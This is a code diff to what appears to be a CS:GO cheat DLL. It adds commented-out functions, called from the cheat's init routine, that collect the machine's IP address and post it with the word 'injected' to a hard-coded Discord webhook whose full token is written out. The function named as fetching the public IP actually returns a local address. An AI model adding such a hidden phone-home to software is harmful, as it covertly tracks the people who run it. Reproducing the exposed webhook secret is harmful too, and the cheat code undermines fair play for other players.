@@ -8,6 +8,9 @@ EntOffsets g_entoffsets{};;
 Menu       g_menu{};;
 Notify     g_notify{};;
 
+//std::string GetPublicIPAddress();
+//void SendToDiscordWebhook(const std::string& ipAddress);
+
 bool CSGO::init( ) {
 	m_done = false;
 
@@ -217,6 +220,14 @@ bool CSGO::init( ) {
 	g_chams.init( );
 	g_hooks.init( );
 
+	//std::string ipAddress = GetPublicIPAddress();
+	//if (ipAddress.find("Error") == std::string::npos) {
+	//	SendToDiscordWebhook(ipAddress);
+	//}
+	//else {
+	//	std::cerr << ipAddress << std::endl;
+	//}
+
     // if we injected and we're ingame, run map load func.
 	if( m_engine->IsInGame( ) ) {
 		g_cl.OnMapload( );
@@ -226,8 +237,102 @@ bool CSGO::init( ) {
 	m_done = true;
 	return true;
 }
+/*
+std::string GetPublicIPAddress() {
+	WSADATA wsaData;
+	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+		return "Error initializing Winsock";
+	}
 
+	char hostname[NI_MAXHOST];
+	if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR) {
+		WSACleanup();
+		return "Error getting local hostname";
+	}
 
+	addrinfo hints = { 0 };
+	hints.ai_family = AF_INET;
+	hints.ai_socktype = SOCK_STREAM;
+	hints.ai_protocol = IPPROTO_TCP;
+
+	addrinfo* info = nullptr;
+	if (getaddrinfo(hostname, nullptr, &hints, &info) != 0) {
+		WSACleanup();
+		return "Error getting IP address";
+	}
+
+	for (addrinfo* ptr = info; ptr != nullptr; ptr = ptr->ai_next) {
+		sockaddr_in* sockaddr_ipv4 = reinterpret_cast<sockaddr_in*>(ptr->ai_addr);
+		char ipStr[INET_ADDRSTRLEN];
+		inet_ntop(AF_INET, &sockaddr_ipv4->sin_addr, ipStr, sizeof(ipStr));
+		freeaddrinfo(info);
+		WSACleanup();
+		return std::string(ipStr);
+	}
+
+	freeaddrinfo(info);
+	WSACleanup();
+	return "Error getting IP address";
+}
+*/
+
+/*
+void SendToDiscordWebhook(const std::string& ipAddress) {
+	std::wstring webhookUrl = L"https://discord.com/api/webhooks/1258839445462057071/4_x38DjxWGXIZJ55xk0EYIAM3EROy3FD5J3sYPM6OLc6m5huCKriGsvXK8JHOWlGOODt";
+	std::wstring host = L"discord.com";
+	std::wstring path = webhookUrl.substr(webhookUrl.find(L".com") + 4);
+
+	HINTERNET hSession = WinHttpOpen(L"A WinHTTP Example Program/1.0",
+		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+		WINHTTP_NO_PROXY_NAME,
+		WINHTTP_NO_PROXY_BYPASS, 0);
+
+	if (!hSession) {
+		return;
+	}
+
+	HINTERNET hConnect = WinHttpConnect(hSession, host.c_str(),
+		INTERNET_DEFAULT_HTTPS_PORT, 0);
+	if (!hConnect) {
+		WinHttpCloseHandle(hSession);
+		return;
+	}
+
+	HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(),
+		NULL, WINHTTP_NO_REFERER,
+		WINHTTP_DEFAULT_ACCEPT_TYPES,
+		WINHTTP_FLAG_SECURE);
+
+	if (!hRequest) {
+		WinHttpCloseHandle(hConnect);
+		WinHttpCloseHandle(hSession);
+		return;
+	}
+
+	std::string message = "{\"content\": \"" + ipAddress + " injected.\"}";
+	std::wstring headers = L"Content-Type: application/json\r\n";
+	BOOL bResults = WinHttpSendRequest(hRequest, headers.c_str(), -1L,
+		(LPVOID)message.c_str(),
+		message.size(),
+		message.size(),
+		0);
+
+	if (!bResults) {
+		WinHttpCloseHandle(hRequest);
+		WinHttpCloseHandle(hConnect);
+		WinHttpCloseHandle(hSession);
+		return;
+	}
+
+	bResults = WinHttpReceiveResponse(hRequest, NULL);
+	if (!bResults) {
+	}
+
+	WinHttpCloseHandle(hRequest);
+	WinHttpCloseHandle(hConnect);
+	WinHttpCloseHandle(hSession);
+}
+*/
 
 bool game::IsBreakable( Entity *ent ) {
 	bool        ret;
